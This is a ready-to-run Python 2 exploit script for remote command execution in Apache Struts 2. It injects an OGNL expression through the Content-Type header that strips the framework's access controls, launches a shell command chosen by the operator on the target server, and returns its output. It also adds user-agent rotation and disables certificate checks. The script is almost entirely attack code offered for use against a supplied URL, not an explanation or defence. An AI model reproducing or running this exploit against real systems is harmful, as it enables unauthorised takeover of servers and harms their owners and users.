#!/usr/bin/env python2

import os
import re
import sys
import base64
import random
import requests
import optparse

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

data00 = "ChtbOTJtCgogIF8gICAgICBfICAgICAgICAgXyAgICAgICAgICAgICAgICAgIF8gICAgICAgICBfICAgICAgICAgICAgXyAgICAgICAgICAgICBfICAgICAgCi9fL1wgICAgL1wgXCAgICAgLyAvXCAgICAgICAgICAgICAgICAvXCBcICAgICAgLyAvXCAgICAgICAgIC9cIFwgICAgICAgICAvXCBcICAgICAKXCBcIFwgICBcIFxfXCAgIC8gLyAgXCAgICAgICAgICAgICAgLyAgXCBcICAgIC8gLyAgXCAgICAgICAvICBcIFwgICAgICAgLyAgXCBcICAgIAogXCBcIFxfXy8gLyAvICAvIC8gL1wgXCAgICAgICAgICAgIC8gL1wgXCBcICAvIC8gL1wgXF9fICAgLyAvXCBcIFwgICAgIC8gL1wgXCBcICAgCiAgXCBcX18gXC9fLyAgLyAvIC9cIFwgXCAgICAgICAgICAvIC8gL1wgXF9cLyAvIC9cIFxfX19cIC8gLyAvXCBcX1wgICAvIC8gL1wgXCBcICAKICAgXC9fL1xfXy9cIC9fLyAvICBcIFwgXCAgICAgICAgLyAvXy9fIFwvXy9cIFwgXCBcL19fXy8vIC9fL18gXC9fLyAgLyAvIC8gIFwgXF9cIAogICAgXy9cL19fXCBcXCBcIFwgICBcIFwgXCAgICAgIC8gL19fX18vXCAgICBcIFwgXCAgICAgLyAvX19fXy9cICAgIC8gLyAvICAgIFwvXy8gCiAgIC8gXy9fL1wgXCBcXCBcIFwgICBcIFwgXCAgICAvIC9cX19fX1wvXyAgICBcIFwgXCAgIC8gL1xfX19fXC8gICAvIC8gLyAgICAgICAgICAKICAvIC8gLyAgIFwgXCBcXCBcIFxfX19cIFwgXCAgLyAvIC8gICAgIC9fL1xfXy8gLyAvICAvIC8gL19fX19fXyAgLyAvIC9fX19fX19fXyAgIAogLyAvIC8gICAgL18vIC8gXCBcL19fX19cIFwgXC8gLyAvICAgICAgXCBcL19fXy8gLyAgLyAvIC9fX19fX19fXC8gLyAvX19fX19fX19fXCAgCiBcL18vICAgICBcX1wvICAgXF9fX19fX19fX1wvXC9fLyAgICAgICAgXF9fX19fXC8gICBcL19fX19fX19fX18vXC9fX19fX19fX19fX18vICAKChtbMG0KG1s5MW0gICAgICAgICAgICAgICAgICAgICAgICBbQ1ZFOiAyMDE1LTU2MzggLSBBcGFjaGUgU3RydXRzIDJdChtbMG0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnk6IDB4NjQ2NDVmQGdtYWlsLmNvbQoK"
data01 = "JXByb2cgLXUgVVJMIFstYyBDTURdCgpVc2FnZTogJXByb2cgLXUgJ2h0dHA6Ly92dWxuLm5ldCcKClVzYWdlOiAlcHJvZyAtdSAnaHR0cDovL3Z1bG4ubmV0JyAtYyAnaWZjb25maWcgLWEnCg=="

p = optparse.OptionParser(usage=base64.b64decode(data01))
p.add_option('-u', '--url', action="store", default=None, dest="url", type="string", help="Target URL")
p.add_option('-c', '--cmd', action="store", default=None, dest="cmd", type="string", help="RCE Command")
p.add_option('-a', '--uaf', action="store", default=None, dest="uaf", type="string", help="Custom User-Agent File")
(option, arg) = p.parse_args()

url = option.url if option.url else None
cmd = option.cmd if option.cmd else 'id'
uaf = option.uaf if option.uaf else 'user-agents.txt'

def intro():
	print("")
	print(base64.b64decode(data00))

def rand_ua(ua_file):
	uaf=ua_file
	if os.path.isfile(uaf):
		ua_list = open(uaf).read().splitlines()
		return random.choice(ua_list)
	else:
		return "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36"

def parse_url(url):
    url = url.rstrip(":")
    if not re.match("^(http|https)://", url):
		url = "http://" + url
    else:
		url = url
    return url


def exploit(url, cmd):
    url = parse_url(url)
    to = 15 #timeout in seconds
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % cmd
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"
        
    headers = { 'User-Agent': rand_ua(uaf), 'Content-Type': str(payload), 'Accept': '*/*' }

    try:
		ret = requests.get(url, headers=headers, verify=False, timeout=to, allow_redirects=False).text
    except requests.exceptions.Timeout:
		print("[x] Connection timed out\n")
		sys.exit(1)
    except Exception as e:
		if str(e[0].reason).find("Errno 111"):
			print "[!] Error: Connection Refused... Attempt Failed!\n"
			sys.exit(1)
		else:
			print("[!] Exception: %s\n") % (str(e))
			ret = "[!] Error: " + str(e) + "\n"
    return ret
    

if __name__ == '__main__':
	intro()
	print("[*] Attempting to run `%s` on %s\n") % (cmd, url)
	output = exploit(url, cmd)
	print("[*] Returned data\n")
	print(output)
